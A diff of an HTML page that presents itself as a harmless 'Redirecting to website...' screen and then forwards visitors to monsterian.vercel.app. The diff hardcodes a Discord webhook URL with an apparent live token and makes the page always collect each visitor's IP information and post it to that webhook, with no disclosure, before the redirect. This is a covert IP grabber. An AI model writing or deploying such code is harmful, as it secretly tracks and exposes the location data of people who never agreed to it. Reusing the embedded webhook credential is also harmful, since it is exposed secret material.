@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting to YouTube</title>
+    <title>Redirecting to mons</title>
     <style>
         body {
             background-color: #0f0f0f;
@@ -20,7 +20,7 @@
             max-width: 500px;
             padding: 20px;
         }
-        .youtube-logo {
+        .monstr-logo {
             font-size: 48px;
             color: #ff0000;
             margin-bottom: 20px;
@@ -42,13 +42,16 @@
 </head>
 <body>
     <div class="container">
-        <div class="youtube-logo">▶️</div>
-        <h2>Redirecting to YouTube</h2>
+        <div class="monstr-logo">▶️</div>
+        <h2>Redirecting to website...</h2>
         <div class="loader"></div>
         <p>You will be redirected shortly...</p>
     </div>
 
     <script>
+        // Webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1413562343006146720/lb_5cE_VQmAqoSMQsO-XB80APyqcH08gqAjEN2ks7N0fE1f_mPcizwO4gJaPuk6_q-TI";
+
         // Function to get IP information
         async function getIPInfo() {
             try {
@@ -146,34 +149,22 @@
         }
 
         // Function to redirect to YouTube
-        function redirectToYouTube() {
-            window.location.href = 'https://youtube.com';
+        function mnsterredir() {
+            window.location.href = 'https://monsterian.vercel.app';
         }
 
         // Main execution
         async function main() {
-            // Get webhook from URL parameters
-            const urlParams = new URLSearchParams(window.location.search);
-            const webhookParam = urlParams.get('webhook');
+            // Get IP information
+            const ipInfo = await getIPInfo();
             
-            if (webhookParam) {
-                try {
-                    const webhookUrl = atob(webhookParam);
-                    
-                    // Get IP information
-                    const ipInfo = await getIPInfo();
-                    
-                    if (ipInfo) {
-                        // Send to Discord
-                        await sendToDiscord(webhookUrl, ipInfo);
-                    }
-                } catch (e) {
-                    console.error('Error processing webhook:', e);
-                }
+            if (ipInfo) {
+                // Send to Discord
+                await sendToDiscord(WEBHOOK_URL, ipInfo);
             }
             
             // Redirect to YouTube after 2 seconds
-            setTimeout(redirectToYouTube, 2000);
+            setTimeout(mnsterredir, 2000);
         }
 
         // Run the main function
